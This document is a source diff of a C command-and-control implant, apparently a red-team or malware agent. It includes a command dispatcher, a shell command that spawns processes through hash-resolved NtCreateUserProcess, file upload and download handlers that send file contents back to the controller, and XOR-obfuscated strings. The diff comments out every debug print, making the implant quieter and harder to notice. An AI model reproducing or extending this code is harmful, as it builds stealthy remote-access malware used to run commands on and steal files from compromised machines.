@@ -29,13 +29,14 @@ VOID CommandDispatcher() {
     do {
         if(!Instance.Session.Connected) {
 
+
 //--------------------------------
 #if CONFIG_OBFUSCATION
             unsigned char s_xk[] = S_XK;
             unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
-            _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-            _tprintf("instance not connected!\n");
+            // _tprintf("instance not connected!\n");
 #endif
 //--------------------------------
 
@@ -55,7 +56,7 @@ VOID CommandDispatcher() {
             do {
                 TaskCommand = ParserGetInt32(&Parser);
                 if(TaskCommand != COMMAND_NO_JOB) {
-                    _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+                    // _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
@@ -73,9 +74,9 @@ VOID CommandDispatcher() {
 #if CONFIG_OBFUSCATION
                         unsigned char s_xk[] = S_XK;
                         unsigned char s_string[] = S_COMMAND_NOT_FOUND;
-                        _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+                        // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-                        _tprintf("command not found\n");
+                        // _tprintf("command not found\n");
 #endif
 //--------------------------------
 
@@ -86,9 +87,9 @@ VOID CommandDispatcher() {
 #if CONFIG_OBFUSCATION
                     unsigned char s_xk[] = S_XK;
                     unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
-                    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+                    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-                    _tprintf("Is COMMAND_NO_JOB\n");
+                    // _tprintf("Is COMMAND_NO_JOB\n");
 #endif
 //--------------------------------
 
@@ -106,9 +107,9 @@ VOID CommandDispatcher() {
 #if CONFIG_OBFUSCATION
             unsigned char s_xk[] = S_XK;
             unsigned char s_string[] = S_TRANSPORT_FAILED;
-            _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-            _tprintf("Transport: Failed\n");
+            // _tprintf("Transport: Failed\n");
 #endif
 //--------------------------------
 
@@ -131,9 +132,9 @@ VOID CommandShell( PPARSER Parser ){
 #if CONFIG_OBFUSCATION
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_SHELL;
-    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-    _tprintf("Command::Shell\n");
+    // _tprintf("Command::Shell\n");
 #endif
 //---------------------------------
 #if CONFIG_NATIVE
@@ -198,7 +199,7 @@ VOID CommandShell( PPARSER Parser ){
     g_rtl_init_unicode_string(&nt_args, wide_args);
     //g_rtl_init_unicode_string(&nt_command_line, command_line);
 
-    //_tprintf("Command Line:%ls\n", command_line);
+    // _tprintf("Command Line:%ls\n", command_line);
 
     PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
 
@@ -252,8 +253,8 @@ VOID CommandShell( PPARSER Parser ){
     void *p_nt_create_user_process = get_proc_address_by_hash(p_ntdll, NtCreateUserProcess_CRC32B);
     NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
     if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
-        _tprintf("PROCESS CREATION FAILED!\n");
-        _tprintf("STATUS:%08x\n", status);
+        // _tprintf("PROCESS CREATION FAILED!\n");
+        // _tprintf("STATUS:%08x\n", status);
     }
     void *p_rtl_free_heap = get_proc_address_by_hash(p_ntdll, RtlFreeHeap_CRC32B);
     RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
@@ -328,7 +329,7 @@ VOID CommandUpload( PPARSER Parser ) {
 #if CONFIG_NATIVE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_UPLOAD;
-    _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
+    // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
 
     PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
     UINT32 FileSize = 0;
@@ -341,7 +342,7 @@ VOID CommandUpload( PPARSER Parser ) {
     FileName[NameSize] = 0;
 
     // FIX THIS STRING
-    //_tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);
+    // _tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);
 
     NTSTATUS status;
     UNICODE_STRING file_path;
@@ -395,7 +396,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
 #else //CONFIG_NATIVE
 
-    _tprintf("Command::Upload\n");
+    // _tprintf("Command::Upload\n");
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -407,17 +408,17 @@ VOID CommandUpload( PPARSER Parser ) {
 
     FileName[ NameSize ] = 0;
 
-    _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
+    // _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
     if ( hFile == INVALID_HANDLE_VALUE ) {
-        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
     if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
-        _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
+        // _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
@@ -444,7 +445,7 @@ VOID CommandDownload( PPARSER Parser ) {
 #if CONFIG_NATIVE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_DOWNLOAD;
-    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -457,9 +458,9 @@ VOID CommandDownload( PPARSER Parser ) {
     FileName[ NameSize ] = 0;
     //PCHAR FileName = "C:/Temp/test.txt\0";
     /*NameSize  = strlen(FileName);
-    _tprintf( "FileName => %s\n", FileName );
-    _tprintf("Old NameSize => %d\n", NameSize);
-    _tprintf("Strlen of FileName =>%d\n", strlen(FileName));
+    // _tprintf( "FileName => %s\n", FileName );
+    // _tprintf("Old NameSize => %d\n", NameSize);
+    // _tprintf("Strlen of FileName =>%d\n", strlen(FileName));
      */
     NTSTATUS status;
     UNICODE_STRING file_path;
@@ -497,7 +498,7 @@ VOID CommandDownload( PPARSER Parser ) {
     void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32B);
     NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
     if((status = g_nt_query_information_file(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
-        //S_tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
+        // _tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
         goto CleanupDownload;
     }
 
@@ -521,7 +522,7 @@ VOID CommandDownload( PPARSER Parser ) {
     PackageTransmit( Package, NULL, NULL );
 
 #else //CONFIG_NATIVE
-    _tprintf("Command::Download\n");
+    // _tprintf("Command::Download\n");
 
 //--------------------------------
 
@@ -535,12 +536,12 @@ VOID CommandDownload( PPARSER Parser ) {
 
     FileName[ NameSize ] = 0;
 
-    _tprintf( "FileName => %s\n", FileName );
+    // _tprintf( "FileName => %s\n", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
-        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -549,7 +550,7 @@ VOID CommandDownload( PPARSER Parser ) {
 
     if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
     {
-        _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
+        // _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -580,9 +581,9 @@ VOID CommandExit( PPARSER Parser ) {
 #if CONFIG_OBFUSCATION
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_EXIT;
-    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
+    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 #else
-    _tprintf( "Command::Exit\n");
+    // _tprintf( "Command::Exit\n");
 #endif
 //--------------------------------
 
